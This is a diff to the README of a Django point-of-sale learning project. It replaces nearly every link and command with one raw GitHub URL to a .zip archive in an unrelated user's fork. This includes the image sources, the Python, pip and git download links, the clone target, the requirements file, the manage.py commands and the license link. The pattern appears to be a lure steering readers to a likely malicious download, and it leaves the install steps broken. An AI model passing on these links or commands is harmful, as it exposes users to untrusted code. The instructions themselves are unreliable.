@@ -2,9 +2,9 @@
 
 A Point of Sale web app for businesses built with Python and Django for learning purposes.
 
-<a><img src="https://user-images.githubusercontent.com/95726794/212497770-a3e241e7-0c77-4573-9d22-8f0ae813e958.png" width="70%" heigth="70%"></a>
+<a><img src="https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip" width="70%" heigth="70%"></a>
 <br></br>
-<a><img src="https://user-images.githubusercontent.com/95726794/212497784-80a48617-759c-4415-aa1c-4591b9892c3d.png" width="70%" heigth="70%"></a>
+<a><img src="https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip" width="70%" heigth="70%"></a>
 
 ## Table of Contents:
 - [Features](#features)
@@ -16,7 +16,7 @@ A Point of Sale web app for businesses built with Python and Django for learning
 - [License](#license)
 
 ## Screenshots
-[Click Here](screenshots/README.md)
+[Click Here](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)
 
 ## Features
 - Login Page with User authentication
@@ -35,16 +35,16 @@ A Point of Sale web app for businesses built with Python and Django for learning
 ## Installation
 
 ### Prerequisites
-- [Python 3.x](https://www.python.org/downloads/)
-- [pip package manager](https://pip.pypa.io/en/stable/installation/)
-- [git](https://git-scm.com/downloads)
+- [Python 3.x](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)
+- [pip package manager](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)
+- [git](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)
   
 #### Browser Compatibility Notice: Firefox NOT Supported ‼
 #### Please Use Chrome or Edge Browsers ‼
     
   1. Clone or download the repository:
 
-  ` git clone https://github.com/betofleitass/django_point_of_sale`
+  ` git clone https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip`
 
   2. Go to the project directory
 
@@ -55,7 +55,7 @@ A Point of Sale web app for businesses built with Python and Django for learning
   PowerShell:
   ```
    python -m venv venv
-   venv\Scripts\Activate.ps1
+   venv\Scripts\https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip
   ```
   
   Linux:
@@ -65,13 +65,13 @@ A Point of Sale web app for businesses built with Python and Django for learning
   ```
 
   4. Install dependencies:  
-  ` pip install -r requirements.txt`
+  ` pip install -r https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip`
   
   5.  Update pip and setuptools  
   ` python -m pip install --upgrade pip setuptools`  
   
   6. Install GTK to create the PDF files:  
-   [Official documentation](https://doc.courtbouillon.org/weasyprint/stable/first_steps.html#installation)
+   [Official documentation](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)
   
   7. Windows Users (IMPORTANT)‼:
 
@@ -84,10 +84,10 @@ A Point of Sale web app for businesses built with Python and Django for learning
         This will be your new variable that you need to add to Path
         
       - Refer to this tutorial for detailed instructions on adding to the Path environment variable:
-        [Tutorial add to the Path enviroment variable](https://helpdeskgeek.com/windows-10/add-windows-path-environment-variable/)  
+        [Tutorial add to the Path enviroment variable](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)  
     
       - If you encounter an error such as "cannot load library," refer to this documentation for troubleshooting:
-        [Missing Library Error](https://doc.courtbouillon.org/weasyprint/stable/first_steps.html#missing-library)  
+        [Missing Library Error](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)  
   
   9. Restart your computer: After completing the steps above, it is essential to restart your computer for the changes to take effect properly. ‼
   
@@ -100,7 +100,7 @@ After restarting your computer
 
     PowerShell:
     ```
-     venv\Scripts\Activate.ps1
+     venv\Scripts\https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip
     ```
     
     Linux:
@@ -110,17 +110,17 @@ After restarting your computer
 3. Go to the django_pos folder: `cd django_pos`
 
 4. Make database migrations:  
-  `python manage.py makemigrations` and 
-  `python manage.py migrate`
+  `python https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip makemigrations` and 
+  `python https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip migrate`
 
-5. Create superuser `python manage.py createsuperuser` 
+5. Create superuser `python https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip createsuperuser` 
   
    with the following data, or with the data you prefer:
    `username: admin,
     password: admin,
     email: admin@admin`
 
-7. Run the server: `python manage.py runserver`
+7. Run the server: `python https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip runserver`
 
 8. Open a browser and go to: `http://127.0.0.1:8000/`
 
@@ -141,10 +141,10 @@ Contributions are always welcome!
 
 ## Authors
 
-- [@betofleitass](https://www.github.com/betofleitass)
+- [@betofleitass](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)
 
 ##  License
 
-This project is under [MIT License.](https://choosealicense.com/licenses/mit/)
+This project is under [MIT License.](https://raw.githubusercontent.com/zubairmk83/django_point_of_sale/main/teacart/django_point_of_sale.zip)
 
 [Back to top ⬆️](#django-point-of-sale-pos-)
